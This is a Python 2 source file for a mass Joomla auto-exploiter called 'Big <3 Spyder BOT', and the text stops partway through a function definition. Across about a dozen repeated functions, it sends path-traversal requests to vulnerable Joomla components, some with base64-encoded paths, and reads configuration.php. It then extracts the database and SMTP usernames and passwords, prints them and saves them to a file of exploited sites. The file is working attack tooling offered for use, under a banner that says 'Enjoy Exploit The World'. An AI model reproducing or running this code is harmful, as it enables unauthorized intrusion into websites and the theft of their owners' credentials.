#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import os
import sys
import re
import datetime
import urllib
from platform import system
from time import time as timer
os.system('cls' if os.name == 'nt' else 'clear')



print """ \033[1;32m

           ____                      ,
          /---.'.__             ____//
               '--.\           /.---'
          _______  \\         //                                       
        /.------.\  \|      .'/  ______
       //  ___  \ \ ||/|\  //  _/_----.\__
      |/  /.-.\  \ \:|< >|// _/.'..\   '--'
         //   \'. | \'.|.'/ /_/ /  \\                 
        //     \ \_\/" ' ~\-'.-'    \\
       //       '-._| :H: |'-.__     \\
      //           (/'==='\)'-._\     ||
      ||                        \\    \|
      ||                         \\    '
      |/                          \\
                                   ||
                                   ||
                                   \\
                                    '                  
                                                    Tool : Big <3 Spyder BOT
                                            Zero Day : 16 Public and 2 Priv8 Exploit 
 

                                            Name Can be Fake your Ability Cant Fake 
                                               I love Auto Exploiter Bot <3 
                                               
\033[0;m 
\033[1;36m##========================================================##\033[0;m                        
\033[1;36m##\033[0;m     \033[1;42mCredit- Badbl00d17 ==> Enjoy Exploit The World\033[0;m   \033[1;36m  ##\033[0;m 
\033[1;36m##========================================================##\033[0;m

[EXP] =====> \033[1;42mMass Exploit List\033[0;m (Press EXP Start Attack with Lista)

    """ 

def attack():
    timer = datetime.datetime.now()
    print "\033[94m[>]\033[0m Trying to exploit: %s on %s" % (url,timer)
    Logger()
    version_cms_detect()

            
def com_hdflvplayer():
    req = requests.get(url + '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')    

def com_cckjseblod():
    req = requests.get(url + '/index.php?option=com_cckjseblod&task=download&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')  
	


def com_joomanager():
    req = requests.get(url + '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def com_aceftp():
    req = requests.get(url + '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def com_jtagmembersdirectory():
    req = requests.get(url + '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def com_macgallery():
    req = requests.get(url + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def com_facegallery():
    req = requests.get(url + '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def s5_media_player():
    req = requests.get(url + '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def com_docman():
    req = requests.get(url + '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def mod_dvfoldercontent():
    req = requests.get(url + '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_addproperty():
    req = requests.get(url + '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def com_contushdvideoshare():
    req = requests.get(url + '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')


def com_jetext():
    req = requests.get(url + '/index.php?option=com_jetext&task=download&file=../../configuration.phF', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[$]\033[0m \033[1;41m Config LFI Disclosure. Found\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
        #Print Config like Boss 
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        print " SMTP HOST:",smtphost
        print " SMTP USER:",smtpuser
        print " SMTP PASS:",smtppass
        print " SMTP PORT:",smtpport
        print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Exploited/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')



def com_product_modul():
